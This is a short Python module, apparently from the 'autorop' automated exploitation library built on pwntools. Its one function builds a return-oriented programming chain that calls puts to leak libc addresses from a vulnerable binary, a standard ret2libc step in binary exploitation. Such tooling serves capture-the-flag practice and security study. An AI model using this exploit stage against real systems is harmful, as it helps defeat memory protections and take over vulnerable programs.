from autorop import PwnState, arutil
from pwn import ROP


def puts(state: PwnState) -> PwnState:
    """Leak libc addresses using ``puts``.

    This function leaks the libc addresses of ``__libc_start_main`` and ``puts``
    using ``puts``, placing them in ``state.leaks``.

    Arguments:
        state: The current ``PwnState`` with the following set

            - ``target``: What we want to exploit.
            - ``elf``: pwntools ``ELF`` of ``state.binary_name``.
            - ``overwriter``: Function which writes rop chain to the "right place".
            - ``vuln_function``: Name of vulnerable function in binary,
              which we can return to repeatedly.

    Returns:
        Mutated ``PwnState``, with the following updated

            - ``leaks``: Updated with ``"symbol": address`` pairs for each
              function address of libc that was leaked.
    """
    LEAK_FUNCS = ["__libc_start_main", "puts"]

    def leaker(rop: ROP, address: int) -> ROP:
        arutil.align_call(rop, "puts", [address])
        return rop

    return arutil.leak_helper(state, leaker, LEAK_FUNCS)
